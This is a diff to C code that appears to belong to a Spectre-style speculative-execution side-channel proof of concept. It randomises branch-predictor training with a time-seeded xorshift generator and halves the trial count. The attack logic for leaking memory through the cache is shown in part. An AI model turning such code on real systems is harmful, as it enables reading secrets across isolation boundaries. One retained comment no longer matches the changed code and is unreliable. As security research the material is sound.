@@ -2,6 +2,7 @@
 #include <stdint.h>
 #include <stdlib.h>
 #include <sys/mman.h>
+#include <time.h>
 
 #include "spec.h"
 
@@ -22,6 +23,7 @@ victim_function(void const*const arr)
 void
 spec_access(void const*const ptr)
 {
+    struct xorshift32_state rng = {.a=time(NULL)};
     uintptr_t const training_val = (uintptr_t)&val;
     uintptr_t const malicious = (uintptr_t)ptr;
     valid_ptr = (void *)&val;
@@ -33,10 +35,10 @@ spec_access(void const*const ptr)
          * the malicious value 1 out of every 11 times through this loop
          */
 #if UINTPTR_MAX == 0xffffffffffffffffull
-        uintptr_t x = (((uintptr_t)i % 11) - 1) & 0xffffffff00000000ul;
+        uintptr_t x = (((uintptr_t)xorshift32(&rng) & 0x1fu) - 1) & 0xffffffff00000000ul;
         x |= x >> 32;
 #elif UINTPTR_MAX == 0xffffffffull
-        uintptr_t x = (((uintptr_t)i % 11) - 1) & 0xffff0000ul;
+        uintptr_t x = (((uintptr_t)xorshift32(&rng) & 0x1fu) - 1) & 0xffff0000ul;
         x |= x >> 16;
 #else
 # error What?
@@ -64,7 +66,7 @@ just_prefetch(void const*const ptr)
 
 unsigned char abba[256 * 512];
 
-#define NUM_TRIALS (1 << 11)
+#define NUM_TRIALS (1 << 10)
 #define CACHE_HIT_THRESHOLD 100
 
 void
